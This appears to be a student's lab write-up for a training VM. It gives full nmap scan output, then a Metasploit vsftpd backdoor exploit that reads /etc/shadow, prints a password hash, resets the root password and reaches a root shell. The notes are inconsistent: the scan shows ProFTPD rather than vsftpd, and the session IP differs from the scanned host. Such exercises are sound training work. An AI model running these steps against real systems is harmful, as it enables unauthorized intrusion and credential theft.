# Level 1 (Linux)

## nmap scan results

```
sudo nmap -A 10.0.2.3    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 11:49 CST
Nmap scan report for 10.0.2.3
Host is up (0.0029s latency).
Not shown: 991 filtered tcp ports (no-response)
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 2b:2e:1f:a4:54:26:87:76:12:26:59:58:0d:da:3b:04 (DSA)
|   2048 c9:ac:70:ef:f8:de:8b:a3:a3:44:ab:3d:32:0a:5c:6a (RSA)
|   256 c0:49:cc:18:7b:27:a4:07:0d:2a:0d:bb:42:4c:36:17 (ECDSA)
|_  256 a0:76:f3:76:f8:f0:70:4d:09:ca:e1:10:fd:a9:cc:0a (ED25519)
80/tcp   open   http        Apache httpd 2.4.7
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2020-10-29 19:37  chat/
| -     2011-07-27 20:17  drupal/
| 1.7K  2020-10-29 19:37  payroll_app.php
| -     2013-04-08 12:06  phpmyadmin/
|_
|_http-server-header: Apache/2.4.7 (Ubuntu)
445/tcp  open   netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
|_http-server-header: CUPS/1.7 IPP/2.1
|_http-title: Home - CUPS 1.7.2
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
8080/tcp open   http        Jetty 8.1.7.v20120910
|_http-server-header: Jetty(8.1.7.v20120910)
|_http-title: Error 404 - Not Found
8181/tcp closed intermapper
MAC Address: 08:00:27:BB:1E:0A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.2 - 4.14 (98%), Linux 3.8 - 3.16 (97%), Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Linux 3.2 - 3.16 (94%), Linux 4.2 (94%), Linux 3.13 - 4.4 (93%), Linux 3.13 - 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Hosts: 127.0.2.1, SEC-NYCU-PMELIN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: sec-nycu-pmelin
|   NetBIOS computer name: SEC-NYCU-PMELIN\x00
|   Domain name: \x00
|   FQDN: sec-nycu-pmelin
|_  System time: 2025-12-06T03:49:47+00:00
| smb2-time: 
|   date: 2025-12-06T03:49:49
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 2s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   2.95 ms 10.0.2.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.87 seconds
```

## attemp 1: Use vsFTPd 2.3.4 bug: The attacker replaced the legitimate vsftpd-2.3.4.tar.gz archive with a malicious version.  

use exploit/unix/ftp/vsftpd_234_backdoor  

set RHOSTS to target ip

exploit --job

Interact with session: session –l && session -i 1

Get password hash cat /etc/shadow

```
$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
```


```
sessions ls

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  2         shell cmd/unix               172.18.253.133:44789 -> 192.168.56.3:6200 (192.168.56.3)

msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1
[-] Invalid session identifier: 1
msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 2
[*] Starting interaction with 2...

passwd
Enter new UNIX password: 0000
Retype new UNIX password: 0000
passwd: password updated successfully
sudo apt update
sudo: apt: command not found
sudo -s
whoami
root
```
